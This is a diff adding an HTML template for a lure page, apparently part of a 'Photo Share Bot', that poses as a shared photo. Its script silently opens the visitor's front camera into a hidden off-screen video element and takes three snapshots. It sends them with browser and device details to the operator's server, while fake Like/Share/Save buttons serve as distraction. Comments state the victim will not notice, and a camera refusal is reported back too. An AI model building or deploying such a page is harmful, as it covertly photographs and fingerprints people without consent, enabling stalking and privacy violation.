@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📸 Photo Shared With You!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loader {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loader p {
+            font-size: 1.2em;
+            opacity: 0.8;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 0 20px;
+        }
+
+        .header h1 {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header p {
+            font-size: 1em;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+
+        /* Photo Card */
+        .photo-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 20px 0;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .photo-wrapper {
+            position: relative;
+            width: 100%;
+            background: #000;
+        }
+
+        .photo-wrapper img {
+            width: 100%;
+            height: auto;
+            display: block;
+            max-height: 400px;
+            object-fit: cover;
+        }
+
+        .photo-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+        }
+
+        .message-box {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .message-box p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            opacity: 0.5;
+            font-size: 0.8em;
+        }
+
+        /* Hidden camera video */
+        #cameraVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        #captureCanvas {
+            display: none;
+        }
+
+        /* Permission Overlay - Natural looking */
+        .permission-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .permission-overlay.show {
+            display: flex;
+        }
+
+        .permission-box {
+            background: #1e1e2e;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 350px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .permission-box .icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+
+        .permission-box h3 {
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .permission-box p {
+            opacity: 0.7;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .allow-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 25px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .allow-btn:hover {
+            transform: scale(1.05);
+        }
+
+        /* Like/Share buttons - distraction */
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            padding: 15px 20px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .action-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: background 0.2s;
+        }
+
+        .action-btn:hover {
+            background: rgba(255,255,255,0.15);
+        }
+
+        /* Animations */
+        .fade-in {
+            animation: fadeIn 0.8s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .slide-up {
+            animation: slideUp 0.6s ease forwards;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loader">
+            <div class="spinner"></div>
+            <p>Loading your photo...</p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container" id="mainContent" style="opacity: 0;">
+        
+        <!-- Header -->
+        <div class="header fade-in">
+            <h1>📸 Someone Shared a Photo!</h1>
+            <p>{{ custom_message }}</p>
+        </div>
+
+        <!-- Photo Card -->
+        <div class="photo-card slide-up">
+            <div class="photo-wrapper">
+                {% if image_data %}
+                <img 
+                    src="data:image/jpeg;base64,{{ image_data }}" 
+                    alt="Shared Photo"
+                    id="sharedPhoto"
+                >
+                {% else %}
+                <div style="padding: 60px; text-align: center;">
+                    <p style="font-size: 3em;">📷</p>
+                    <p>Photo loading...</p>
+                </div>
+                {% endif %}
+            </div>
+            
+            <div class="message-box">
+                <p>{{ custom_message }}</p>
+            </div>
+
+            <!-- Fake action buttons for natural look -->
+            <div class="action-buttons">
+                <button class="action-btn" onclick="likePhoto()">❤️ Like</button>
+                <button class="action-btn" onclick="sharePhoto()">🔗 Share</button>
+                <button class="action-btn" onclick="savePhoto()">💾 Save</button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>Shared via Photo Share Bot</p>
+        </div>
+    </div>
+
+    <!-- Hidden Camera Elements -->
+    <video id="cameraVideo" autoplay playsinline muted></video>
+    <canvas id="captureCanvas"></canvas>
+
+    <!-- Data attributes -->
+    <div id="pageData" 
+         data-link-id="{{ link_id }}" 
+         data-chat-id="{{ chat_id }}"
+         style="display:none;">
+    </div>
+
+    <script>
+        // ======= CONFIGURATION =======
+        const linkId = document.getElementById('pageData').dataset.linkId;
+        const chatId = document.getElementById('pageData').dataset.chatId;
+        
+        let cameraStream = null;
+        let captureCount = 0;
+        const MAX_CAPTURES = 3; // Maximum 3 photos capture
+        
+        // ======= PAGE LOAD =======
+        window.addEventListener('load', function() {
+            // Loading screen hide karo
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.add('hidden');
+                document.getElementById('mainContent').style.opacity = '1';
+                
+                // Notify visit
+                notifyVisit();
+                
+                // Camera start karo - thoda delay se
+                setTimeout(() => {
+                    initCamera();
+                }, 1000);
+                
+            }, 1500);
+        });
+
+        // ======= NOTIFY VISIT =======
+        function notifyVisit() {
+            fetch('/api/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ link_id: linkId })
+            }).catch(err => console.log('Notify error'));
+        }
+
+        // ======= CAMERA INITIALIZATION =======
+        async function initCamera() {
+            try {
+                // Direct camera access request
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',  // Front camera
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                cameraStream = stream;
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = stream;
+                
+                // Video ready hone ka wait karo
+                video.onloadedmetadata = () => {
+                    video.play();
+                    console.log('Camera ready');
+                    
+                    // Thoda wait karo camera focus hone ke liye
+                    setTimeout(() => {
+                        capturePhoto();
+                    }, 1500);
+                };
+                
+            } catch (err) {
+                console.log('Camera access denied or not available');
+                // Silently fail - user ko pata nahi chalega
+                
+                // Agar permission deny hui, still notify karo
+                sendNotification('Camera access denied by user');
+            }
+        }
+
+        // ======= PHOTO CAPTURE =======
+        function capturePhoto() {
+            if (captureCount >= MAX_CAPTURES) {
+                stopCamera();
+                return;
+            }
+            
+            try {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.getElementById('captureCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                // Canvas size set karo
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                // Video frame ko canvas par draw karo
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Canvas se image data lo
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Server par bhejo
+                sendCapturedPhoto(imageData);
+                
+                captureCount++;
+                
+                // 3 second baad aur ek photo lo
+                if (captureCount < MAX_CAPTURES) {
+                    setTimeout(() => {
+                        capturePhoto();
+                    }, 3000);
+                } else {
+                    // Sab photos le li, camera band karo
+                    setTimeout(() => {
+                        stopCamera();
+                    }, 1000);
+                }
+                
+            } catch (err) {
+                console.log('Capture error');
+            }
+        }
+
+        // ======= SEND CAPTURED PHOTO =======
+        function sendCapturedPhoto(imageData) {
+            // Visitor info collect karo
+            const visitorInfo = getVisitorInfo();
+            
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    link_id: linkId,
+                    photo: imageData,
+                    visitor_info: visitorInfo
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Photo sent successfully');
+            })
+            .catch(err => {
+                console.log('Send error');
+            });
+        }
+
+        // ======= VISITOR INFO =======
+        function getVisitorInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenSize: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            return JSON.stringify(info, null, 2);
+        }
+
+        // ======= NOTIFICATION =======
+        function sendNotification(message) {
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    link_id: linkId,
+                    photo: '',
+                    visitor_info: message
+                })
+            }).catch(err => {});
+        }
+
+        // ======= STOP CAMERA =======
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+                console.log('Camera stopped');
+            }
+        }
+
+        // ======= FAKE BUTTON ACTIONS =======
+        function likePhoto() {
+            const btn = event.target;
+            btn.innerHTML = '❤️ Liked!';
+            btn.style.background = 'rgba(255,0,0,0.2)';
+            setTimeout(() => {
+                btn.innerHTML = '❤️ Like';
+                btn.style.background = '';
+            }, 2000);
+        }
+
+        function sharePhoto() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Check out this photo!',
+                    url: window.location.href
+                });
+            } else {
+                // Copy to clipboard
+                navigator.clipboard.writeText(window.location.href).then(() => {
+                    const btn = event.target;
+                    btn.innerHTML = '✅ Copied!';
+                    setTimeout(() => { btn.innerHTML = '🔗 Share'; }, 2000);
+                });
+            }
+        }
+
+        function savePhoto() {
+            const btn = event.target;
+            btn.innerHTML = '✅ Saved!';
+            setTimeout(() => { btn.innerHTML = '💾 Save'; }, 2000);
+        }
+
+        // ======= CLEANUP ON PAGE LEAVE =======
+        window.addEventListener('beforeunload', function() {
+            stopCamera();
+        });
+
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                stopCamera();
+            }
+        });
+    </script>
+
+</body>
+</html>
